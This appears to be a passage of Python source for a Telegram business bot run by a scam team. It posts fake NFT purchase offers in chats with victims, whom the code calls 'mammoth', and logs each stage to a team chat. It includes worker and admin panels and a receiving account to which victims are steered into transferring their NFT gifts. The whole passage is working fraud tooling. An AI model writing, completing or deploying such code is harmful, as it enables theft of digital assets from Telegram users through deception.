    price_log = build_price_log(price, currency)
    log_text = build_log_text(
        "Новый оффер создан!",
        worker_link, mammoth_link, nft_link, price_log
    )
    asyncio.create_task(send_log(log_text))


async def _notify_worker(worker_id, text):
    try:
        await bot.send_message(worker_id, text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Не удалось уведомить воркера {worker_id}: {e}")


def _cancel_timer(offer):
    task = offer.get("timer_task")
    if task and not task.done():
        task.cancel()


# ---------- CALLBACK ----------
@router.callback_query(F.data.startswith("r_"))
async def cb_decline(callback: CallbackQuery):
    offer_id = callback.data[2:]
    offer = offers.get(offer_id)
    if not offer:
        await callback.answer("❌ Оффер не найден", show_alert=True)
        return
    offer["finished"] = True
    _cancel_timer(offer)
    lang = offer["lang"]
    msg = LOCALES[lang]["declined"]
    await callback.answer(msg, show_alert=True)
    try:
        await bot.edit_message_reply_markup(
            chat_id=offer["chat_id"],
            message_id=offer["offer_message_id"],
            business_connection_id=offer["business_connection_id"],
            reply_markup=None
        )
    except Exception as e:
        logging.error(f"Не удалось убрать кнопки: {e}")

    worker_link = user_display(offer.get("worker_username", ""), offer["worker_id"], offer.get("worker_first_name", ""))
    mammoth_link = user_display(offer.get("mammoth_username", ""), offer["mammoth_id"], offer.get("mammoth_title", ""))
    price_log = build_price_log(offer["price"], offer["currency"])
    log_text = build_log_text(
        "Оффер отклонен!",
        worker_link, mammoth_link, offer["nft_link"], price_log
    )
    asyncio.create_task(send_log(log_text))


@router.callback_query(F.data.startswith("a_"))
async def cb_accept(callback: CallbackQuery):
    offer_id = callback.data[2:]
    offer = offers.get(offer_id)
    if not offer:
        await callback.answer("❌ Offer not found", show_alert=True)
        return

    offer["finished"] = True
    _cancel_timer(offer)

    lang = offer["lang"]
    variant = offer.get("variant", "2")
    nft_id = offer["nft_id"]
    nft_link = offer["nft_link"]
    currency = offer["currency"]
    price = offer["price"]
    worker_username = offer.get("worker_username", "")
    worker_id = offer.get("worker_id", 0)
    conn_id = offer["business_connection_id"]
    chat_id = offer["chat_id"]
    old_msg_id = offer["offer_message_id"]

    L = LOCALES[lang]

    # Alert ТОЛЬКО для варианта 1
    if variant == "1":
        worker_nick = f"@{worker_username}" if worker_username else f"ID {worker_id}"
        alert_text = f"{worker_nick}\n\n{L['alert_warning']}"
        await callback.answer(alert_text, show_alert=True)
    else:
        await callback.answer()

    sender_display = format_sender_link(worker_username, worker_id)
    order_id = generate_order_id()

    new_text = build_accept_text(
        lang, variant, nft_id, nft_link, currency,
        price, sender_display, order_id
    )

    # Приоритет юзы для кнопки:
    # 1) админская приемка (если задана)
    # 2) кастом воркера (из /work)
    # 3) @username воркера / ID
    acceptance = get_acceptance_username()
    if acceptance:
        transfer_uname = acceptance
    else:
        transfer_uname = get_transfer_username(worker_id)

    kb = build_accept_kb(lang, worker_id, transfer_uname)

    show_above = (variant == "2")
    lpo = LinkPreviewOptions(
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=show_above
    )

    if lang == "ru":
        try:
            sent = await bot.send_message(
                chat_id=chat_id,
                text=new_text,
                business_connection_id=conn_id,
                parse_mode="HTML",
                reply_markup=kb,
                link_preview_options=lpo
            )
            offer["offer_message_id"] = sent.message_id
            logging.info(f">>> ACCEPT (ru, v{variant}): sent new {sent.message_id}")

            try:
                await bot.delete_business_messages(
                    business_connection_id=conn_id,
                    message_ids=[old_msg_id]
                )
                logging.info(f">>> ACCEPT (ru): deleted old {old_msg_id}")
            except Exception as e:
                logging.error(f"Не удалось удалить старое сообщение: {e}")
        except Exception as e:
            logging.error(f"Не удалось отправить новое (ru), fallback на edit: {e}")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=old_msg_id,
                    business_connection_id=conn_id,
                    text=new_text,
                    parse_mode="HTML",
                    reply_markup=kb,
                    link_preview_options=lpo
                )
                logging.info(f">>> ACCEPT (ru fallback, v{variant}): edited {old_msg_id}")
            except Exception as e2:
                logging.error(f"Fallback edit тоже упал: {e2}")
    else:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=old_msg_id,
                business_connection_id=conn_id,
                text=new_text,
                parse_mode="HTML",
                reply_markup=kb,
                link_preview_options=lpo
            )
            logging.info(f">>> ACCEPT ({lang}, v{variant}): edited message {old_msg_id}")
        except Exception as e:
            logging.error(f"Не удалось отредактировать оффер: {e}")

    worker_link = user_display(offer.get("worker_username", ""), offer["worker_id"], offer.get("worker_first_name", ""))
    mammoth_link = user_display(offer.get("mammoth_username", ""), offer["mammoth_id"], offer.get("mammoth_title", ""))
    price_log = build_price_log(price, currency)
    log_text = build_log_text(
        "Оффер принят!",
        worker_link, mammoth_link, nft_link, price_log
    )
    asyncio.create_task(send_log(log_text))


@router.callback_query(F.data == "confirm_stub")
async def cb_confirm_stub(callback: CallbackQuery):
    mammoth_id = callback.from_user.id
    target_offer = None
    for oid, o in list(offers.items()):
        if o.get("mammoth_id") == mammoth_id and not o.get("nft_sent_logged"):
            target_offer = o
            break

    if target_offer:
        target_offer["nft_sent_logged"] = True
        worker_link = user_display(
            target_offer.get("worker_username", ""),
            target_offer["worker_id"],
            target_offer.get("worker_first_name", "")
        )
        mammoth_link = user_display(
            target_offer.get("mammoth_username", ""),
            target_offer["mammoth_id"],
            target_offer.get("mammoth_title", "")
        )
        price_log = build_price_log(target_offer["price"], target_offer["currency"])
        log_text = build_log_text(
            "Нфт передан!",
            worker_link, mammoth_link, target_offer["nft_link"], price_log
        )
        asyncio.create_task(send_log(log_text))

    await callback.answer()


# ---------- АДМИНКА ----------
def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Список воркеров", callback_data="adm_list")],
        [InlineKeyboardButton(text="➕ Выдать права", callback_data="adm_grant")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="adm_stats")],
        [InlineKeyboardButton(text="📝 Настройки логов", callback_data="adm_logs")],
        [InlineKeyboardButton(text="⚙️ Команда оффера", callback_data="adm_offer_cmd")],
        [InlineKeyboardButton(text="📥 Приемка", callback_data="adm_acceptance")],
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="adm_refresh")],
    ])


async def show_admin_panel(target, edit=False):
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers_count = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]

    log_chat = get_setting("log_chat_id") or "не задан"
    log_topic = get_setting("log_topic_id") or "не задан"
    offer_cmd = get_offer_command()
    acceptance = get_acceptance_username() or "не задана"

    text = (
        "🛡 <b>Админ-панель</b>\n\n"
        f"👥 Всего: <b>{total_users}</b>\n"
        f"🟢 Воркеров: <b>{workers_count}</b>\n"
        f"📦 Офферов в кэше: <b>{len(offers)}</b>\n"
        f"📝 Лог-чат: <code>{log_chat}</code>\n"
        f"🧵 Топик: <code>{log_topic}</code>\n"
        f"⚙️ Команда оффера: <code>{offer_cmd}</code>\n"
        f"📥 Приемка: <code>{acceptance}</code>\n"
        f"🤖 Бот: @{BOT_USERNAME}"
    )
    if edit and isinstance(target, CallbackQuery):
        await target.message.edit_text(text, parse_mode="HTML", reply_markup=admin_kb())
    else:
        msg = target if isinstance(target, Message) else target.message
        await msg.answer(text, parse_mode="HTML", reply_markup=admin_kb())


@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ Доступ запрещён.")
        return
    await show_admin_panel(message)


@router.callback_query(F.data == "adm_refresh")
async def adm_refresh(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await show_admin_panel(cb, edit=True)
    await cb.answer()


@router.callback_query(F.data == "adm_stats")
async def adm_stats(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    workers = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    users = cursor.fetchone()[0]
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{users}</b>\n"
        f"🟢 Воркеров: <b>{workers}</b>\n"
        f"📦 Офферов: <b>{len(offers)}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")]])
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=kb)
    await cb.answer()


# ---------- ПРИЕМКА ----------
def acceptance_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Изменить", callback_data="acc_set")],
        [InlineKeyboardButton(text="🗑 Сбросить", callback_data="acc_reset")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")],
    ])


@router.callback_query(F.data == "adm_acceptance")
async def adm_acceptance(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    acceptance = get_acceptance_username() or "не задана"
    text = (
        "📥 <b>Приемка</b>\n\n"
        f"Текущая: <code>{acceptance}</code>\n\n"
        "Если задана — <b>всегда</b> используется в кнопке «Передать НФТ».\n"
        "Воркеры <b>не смогут</b> изменить свой юз через /work, пока приемка активна.\n\n"
        "Если не задана — используется юз воркера (из /work или его @username)."
    )
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=acceptance_kb())
    await cb.answer()


@router.callback_query(F.data == "acc_set")
async def acc_set(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(AcceptanceStates.waiting_username)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_acceptance")]])
    await cb.message.edit_text(
        "✏️ Отправь <b>username без @</b> для приемки.\n"
        "Например: <code>myusername</code>\n\n"
        "Отправь <code>reset</code> чтобы сбросить.",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(AcceptanceStates.waiting_username)
async def process_acceptance(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    val = (message.text or "").strip()
    if val.lower() == "reset":
        del_acceptance_username()
        await state.clear()
        await message.answer("✅ Приемка сброшена.", reply_markup=admin_kb())
        await adm_acceptance_msg(message)
        return
    if val.startswith("@"):
        val = val[1:]
    if not USERNAME_RE.match(val):
        await message.answer(
            "❌ Невалидный username.\n"
            "Разрешены: латиница, цифры, <code>_</code>. Длина: 4–32 символа.\n"
            "Пример: <code>myusername</code>"
        )
        return
    set_acceptance_username(val)
    await state.clear()
    await message.answer(f"✅ Приемка установлена: <code>{val}</code>", parse_mode="HTML", reply_markup=admin_kb())
    await adm_acceptance_msg(message)


async def adm_acceptance_msg(message: Message):
    acceptance = get_acceptance_username() or "не задана"
    text = (
        "📥 <b>Приемка</b>\n\n"
        f"Текущая: <code>{acceptance}</code>\n\n"
        "Если задана — <b>всегда</b> используется в кнопке «Передать НФТ».\n"
        "Воркеры <b>не смогут</b> изменить свой юз через /work, пока приемка активна.\n\n"
        "Если не задана — используется юз воркера (из /work или его @username)."
    )
    await message.answer(text, parse_mode="HTML", reply_markup=acceptance_kb())


@router.callback_query(F.data == "acc_reset")
async def acc_reset(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    del_acceptance_username()
    await cb.answer("✅ Приемка сброшена", show_alert=True)
    await adm_acceptance(cb)


# ---------- КОМАНДА ОФФЕРА (админ) ----------
@router.callback_query(F.data == "adm_offer_cmd")
async def adm_offer_cmd(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(OfferCmdStates.waiting_command)
    cmd = get_offer_command()
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_back")]])
    await cb.message.edit_text(
        f"⚙️ <b>Команда оффера</b>\n\n"
        f"Текущая: <code>{cmd}</code>\n\n"
        "Отправь новую команду — без пробелов. Можно с <code>/</code> или без.\n"
        "Примеры: <code>/buy</code>, <code>/deal</code>, <code>3133</code>, <code>купить</code>",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(OfferCmdStates.waiting_command)
async def process_offer_cmd(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    cmd = (message.text or "").strip()
    if not cmd or " " in cmd:
        await message.answer("❌ Команда не должна содержать пробелов. Попробуй снова или /admin → Команда оффера → Отмена.", parse_mode="HTML")
        return
    set_setting("offer_command", cmd)
    await state.clear()
    await message.answer(
        f"✅ Команда оффера изменена на <code>{cmd}</code>",
        parse_mode="HTML", reply_markup=admin_kb()
    )


# ---------- НАСТРОЙКИ ЛОГОВ ----------
def logs_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Изменить chat ID", callback_data="logs_set_chat")],
        [InlineKeyboardButton(text="✏️ Изменить topic ID", callback_data="logs_set_topic")],
        [InlineKeyboardButton(text="🗑 Сбросить всё", callback_data="logs_reset")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")],
    ])


@router.callback_query(F.data == "adm_logs")
async def adm_logs(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    log_chat = get_setting("log_chat_id") or "не задан"
    log_topic = get_setting("log_topic_id") or "не задан"
    text = (
        "📝 <b>Настройки логов</b>\n\n"
        f"Лог-чат: <code>{log_chat}</code>\n"
        f"Топик: <code>{log_topic}</code>\n\n"
        "Логи будут отправляться в указанную группу и топик.\n\n"
        "<b>Как узнать chat_id группы:</b>\n"
        "• Перешли любое сообщение из группы в <code>@userinfobot</code>\n\n"
        "<b>Как узнать topic_id:</b>\n"
        "• Перешли сообщение из топика в <code>@userinfobot</code>\n"
        "• Возьми число из строки <code>Thread ID</code>\n\n"
        "Бот должен быть <b>админом группы</b> с правом отправки сообщений."
    )
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=logs_kb())
    await cb.answer()


@router.callback_query(F.data == "logs_set_chat")
async def logs_set_chat(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(LogStates.waiting_chat_id)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_logs")]])
    await cb.message.edit_text(
        "✏️ Отправь <b>chat_id</b> группы (например, <code>-1001234567890</code>):",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(LogStates.waiting_chat_id)
async def process_log_chat(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    val = message.text.strip()
    try:
        chat_id = int(val)
    except ValueError:
        await message.answer("❌ Нужно число (например, -1001234567890). Попробуй снова или /admin → Логи → Отмена.")
        return
    set_setting("log_chat_id", chat_id)
    await state.clear()
    await message.answer(f"✅ Лог-чат установлен: <code>{chat_id}</code>", parse_mode="HTML", reply_markup=admin_kb())


@router.callback_query(F.data == "logs_set_topic")
async def logs_set_topic(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(LogStates.waiting_topic_id)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_logs")]])
    await cb.message.edit_text(
        "✏️ Отправь <b>topic_id</b> (message_thread_id). Обычно небольшое число, например <code>2</code>.\n\n"
        "Если топиков нет — отправь <code>0</code> чтобы не использовать.",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(LogStates.waiting_topic_id)
async def process_log_topic(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    val = message.text.strip()
    try:
        topic_id = int(val)
    except ValueError:
        await message.answer("❌ Нужно число. Попробуй снова или /admin → Логи → Отмена.")
        return
    if topic_id <= 0:
        del_setting("log_topic_id")
        await state.clear()
        await message.answer("✅ Топик сброшен (логи будут в General).", reply_markup=admin_kb())
    else:
        set_setting("log_topic_id", topic_id)
        await state.clear()
        await message.answer(f"✅ Топик установлен: <code>{topic_id}</code>", parse_mode="HTML", reply_markup=admin_kb())


@router.callback_query(F.data == "logs_reset")
async def logs_reset(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    del_setting("log_chat_id")
    del_setting("log_topic_id")
    await cb.answer("✅ Настройки логов сброшены", show_alert=True)
    await adm_logs(cb)


# ---------- СПИСОК ВОРКЕРОВ ----------
def build_workers_kb():
    cursor.execute("SELECT user_id, username FROM users WHERE is_worker = 1 ORDER BY created_at DESC LIMIT 50")
    workers = cursor.fetchall()
    rows = []
    for w in workers:
        uid, uname = w[0], w[1] or ""
        label = f"❌ @{uname}" if uname else f"❌ {uid}"
        rows.append([InlineKeyboardButton(text=label, callback_data=f"rm_{uid}")])
    rows.append([InlineKeyboardButton(text="🔙 Назад", callback_data="adm_back")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def render_workers_list(cb: CallbackQuery):
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    count = cursor.fetchone()[0]
    if count == 0:
        text = "🟢 <b>Воркеров пока нет</b>\n\nДобавь через «➕ Выдать права»."
    else:
        text = (
            f"👥 <b>Воркеры ({count})</b>\n\n"
            "Нажми на воркера, чтобы <b>забрать права</b>."
        )
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=build_workers_kb())


@router.callback_query(F.data == "adm_list")
async def adm_list(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await render_workers_list(cb)
    await cb.answer()


@router.callback_query(F.data.startswith("rm_"))
async def adm_remove_worker(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    try:
        target_id = int(cb.data[3:])
    except ValueError:
        await cb.answer("❌ Ошибка ID", show_alert=True); return
    u = get_user(target_id)
    if not u or u[2] != 1:
        await cb.answer("❌ Уже не воркер", show_alert=True)
        await render_workers_list(cb)
        return
    uname = u[1] or ""
    set_worker(target_id, 0)
    label = f"@{uname}" if uname else f"ID {target_id}"
    await cb.answer(f"✅ Права забраны у {label}", show_alert=True)
    await render_workers_list(cb)


@router.callback_query(F.data == "adm_back")
async def adm_back(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await show_admin_panel(cb, edit=True)
    await cb.answer()


@router.callback_query(F.data == "adm_grant")
async def adm_grant(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(GrantStates.waiting_id)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_back")]])
    await cb.message.edit_text(
        "➕ <b>Выдача прав</b>\n\nОтправьте <b>user_id</b> или <b>@username</b>:",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(GrantStates.waiting_id)
async def process_grant(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    arg = message.text.strip()
    target_id, target_username = await _resolve_target(arg)
    if not target_id:
        await message.answer("❌ Не удалось определить пользователя. Введите ID или @username.", reply_markup=admin_kb())
        return
    set_worker(target_id, 1, target_username)
    await state.clear()
    await message.answer(
        f"✅ Права выданы: <code>{target_id}</code>" + (f" (@{target_username})" if target_username else ""),
        parse_mode="HTML", reply_markup=admin_kb()
    )


async def _resolve_target(arg: str):
    arg = arg.strip()
    if arg.startswith("@"):
        uname = arg[1:]
        cursor.execute("SELECT user_id, username FROM users WHERE LOWER(username) = ?", (uname.lower(),))
        row = cursor.fetchone()
        if row:
            return row[0], row[1]
        return None, None
    if arg.isdigit():
        uid = int(arg)
        u = get_user(uid)
        return uid, (u[1] if u else "")
    return None, None


# ---------- ПАНЕЛЬ ВОРКЕРА ----------
def worker_kb(acceptance_set=False):
    rows = []
    if not acceptance_set:
        rows.append([InlineKeyboardButton(text="✏️ Изменить юз для НФТ", callback_data="w_set_transfer")])
    rows.append([InlineKeyboardButton(text="🔄 Обновить", callback_data="w_refresh")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


async def show_worker_panel(target, user_id, edit=False):
    u = get_user(user_id)
    transfer_uname = get_transfer_username(user_id)
    worker_username = (u[1] if u and u[1] else "")
    offer_cmd = get_offer_command()
    acceptance = get_acceptance_username()

    if acceptance:
        transfer_line = f"<code>{acceptance}</code> — установлена админом (приемка)"
        locked_note = "\n\n🔒 <b>Юз для НФТ установлен админом. Изменить нельзя.</b>"
    elif transfer_uname and USERNAME_RE.match(transfer_uname):
        transfer_line = f"<code>{transfer_uname}</code>"
        locked_note = ""
    elif worker_username:
        transfer_line = f"<code>{worker_username}</code> (твой @username по умолчанию)"
        locked_note = ""
    else:
        transfer_line = "❌ не задан (нет @username и кастома)"
        locked_note = ""

    text = (
        "💼 <b>Панель воркера</b>\n\n"
        f"🆔 Твой ID: <code>{user_id}</code>\n"
        f"👤 Твой @username: " + (f"@{worker_username}" if worker_username else "не задан") + "\n"
        f"📦 Юз для кнопки «Передать НФТ»: {transfer_line}\n\n"
        f"⚙️ Команда оффера: <code>{offer_cmd}</code>\n"
        f"Формат: <code>{offer_cmd} t.me/nft/Name-123 500 stars ru 2</code>"
        + locked_note
    )
    if edit and isinstance(target, CallbackQuery):
        await target.message.edit_text(text, parse_mode="HTML", reply_markup=worker_kb(bool(acceptance)))
    else:
        msg = target if isinstance(target, Message) else target.message
        await msg.answer(text, parse_mode="HTML", reply_markup=worker_kb(bool(acceptance)))


@router.message(Command("work"))
async def cmd_work(message: Message):
    user_id = message.from_user.id
    add_user(user_id, message.from_user.username or "")
    if not is_worker(user_id):
        await message.answer("⛔ У тебя нет прав воркера.")
        return
    await show_worker_panel(message, user_id)


@router.callback_query(F.data == "w_refresh")
async def w_refresh(cb: CallbackQuery):
    if not is_worker(cb.from_user.id):
        await cb.answer("⛔", show_alert=True); return
    await show_worker_panel(cb, cb.from_user.id, edit=True)
    await cb.answer()


@router.callback_query(F.data == "w_set_transfer")
async def w_set_transfer(cb: CallbackQuery, state: FSMContext):
    if not is_worker(cb.from_user.id):
        await cb.answer("⛔", show_alert=True); return
    if get_acceptance_username():
        await cb.answer("🔒 Вы не можете изменить юз, так как админ указал свой!", show_alert=True)
        return
    await state.set_state(WorkerStates.waiting_transfer_username)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="w_refresh")]])
    current = get_transfer_username(cb.from_user.id) or "не задан"
    await cb.message.edit_text(
        f"✏️ <b>Юз для кнопки «Передать НФТ»</b>\n\n"
        f"Текущий: <code>{current}</code>\n\n"
        "Отправь username <b>без @</b> (например, <code>myusername</code>).\n"
        "Именно в этот аккаунт откроется окно отправки подарка, когда покупатель нажмёт «Передать НФТ».\n\n"
        "Отправь <code>reset</code> чтобы сбросить на свой @username по умолчанию.",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(WorkerStates.waiting_transfer_username)
async def process_transfer_username(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if not is_worker(user_id):
        await state.clear()
        return
    if get_acceptance_username():
        await state.clear()
        await message.answer("🔒 Вы не можете изменить юз, так как админ указал свой!")
        return
    val = (message.text or "").strip()
    if val.lower() == "reset":
        cursor.execute("UPDATE users SET transfer_username = NULL WHERE user_id = ?", (user_id,))
        conn.commit()
        await state.clear()
        await message.answer("✅ Юз для НФТ сброшен на свой @username.")
        await show_worker_panel(message, user_id)
        return
    if val.startswith("@"):
        val = val[1:]
    if not USERNAME_RE.match(val):
        await message.answer(
            "❌ Невалидный username.\n"
            "Разрешены: латиница, цифры, <code>_</code>. Длина: 4–32 символа.\n"
            "Пример: <code>myusername</code>\n\n"
            "Отправь ещё раз или напиши <code>reset</code> чтобы сбросить.",
            parse_mode="HTML"
        )
        return
    set_transfer_username(user_id, val)
    await state.clear()
    await message.answer(f"✅ Юз для НФТ установлен: <code>{val}</code>", parse_mode="HTML")
    await show_worker_panel(message, user_id)


# ---------- /start ----------
@router.message(Command("start"))
async def start_cmd(message: Message):
    add_user(message.from_user.id, message.from_user.username or "")
    offer_cmd = get_offer_command()
    await message.answer(
        "👋 <b>Привет!</b>\n\n"
        "Это <b>бизнес-бот для NFT-офферов</b>.\n\n"
        "Подключи его к своему Telegram-аккаунту как <b>бизнес-бота</b> "
        "(Настройки → Telegram Business → Чат-боты), затем в чате с покупателем отправь:\n\n"
        f"<code>{offer_cmd} t.me/nft/ChillFlame-101210 500 stars ru</code>\n\n"
        f"Формат: <code>{offer_cmd} &lt;ссылка&gt; &lt;сумма&gt; &lt;stars|gram&gt; &lt;язык&gt; [1|2]</code>\n"
        "Языки: ru, en, uk, ar, fa, zh\n"
        "Вариант (необязательно): 1 — большой, 2 — короткий (по умолч. 2)\n\n"
        "Для воркеров: <code>/work</code> — панель управления.",
        parse_mode="HTML"
    )


async def main():
    global BOT_USERNAME
    dp.include_router(router)
    me = await bot.get_me()
    BOT_USERNAME = me.username or ""
    print(f"✅ Бизнес-бот @{BOT_USERNAME} запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())